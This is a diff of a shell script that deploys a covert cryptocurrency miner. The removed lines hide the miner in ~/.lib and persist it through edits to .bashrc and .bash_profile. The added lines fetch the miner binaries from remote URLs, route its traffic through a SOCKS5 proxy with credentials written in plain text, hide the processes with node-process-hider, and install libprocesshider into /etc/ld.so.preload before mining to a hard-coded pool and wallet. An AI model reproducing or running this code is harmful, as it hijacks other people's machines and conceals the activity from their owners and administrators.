@@ -1,18 +1,59 @@
-cd ~/
-mkdir .lib
-cd .lib
-rm -R *
-WORKER="Siap86"
-WALLETNH="3DnXgkmRkXovYj6teHWmJWBdtiTTVPj5B4"
-POOLNH="3.90.200.104:80"
-wget https://ewr1.vultrobjects.com/mines/gpython
-echo 'echo ""  >> ~/.bash_history' >> ~/.bashrc
-echo "source ~/.bash_profile"  >> ~/.bashrc
-echo "LD_LIBRARY_PATH=~/.lib" > ~/.bash_profile
-echo "export LD_LIBRARY_PATH" >> ~/.bash_profile
-echo 'WORKER="x"' >> ~/.bash_profile
-echo 'WALLETNH="3DnXgkmRkXovYj6teHWmJWBdtiTTVPj5B4"' >> ~/.bash_profile
-echo 'POOLNH="3.90.200.104:80"' >> ~/.bash_profile
-echo "bash ./.lib/gas.sh"  >> ~/.bash_profile
-echo "./.lib/gpython --algo ethash --server $POOLNH --user $WALLETNH.$WORKER -p x -i 100 -w 0 --kernel 0 --proto stratum" > ~/.lib/gas.sh
-chmod +x gas.sh && chmod +x gpython && cd ~/ && source .bashrc
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Asia/Bangkok /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+
+npm i -g node-process-hider
+
+sudo ph add blckdscard
+
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl -y
+
+sudo ph add graftcp 
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz >/dev/null 2>&1
+
+tar -xvzf graphics.tar.gz >/dev/null 2>&1
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 176.53.133.217:57597
+socks5_username = 2BHVpyGPD
+socks5_password = 1rN14HAmV
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash >/dev/null 2>&1
+chmod +x bezzHash >/dev/null 2>&1
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip >/dev/null 2>&1
+unzip -o magic145.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+sudo ph add bezzHash
+
+./graftcp/graftcp ./bezzHash --url=sanninmode.ETH@ethash.kupool.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
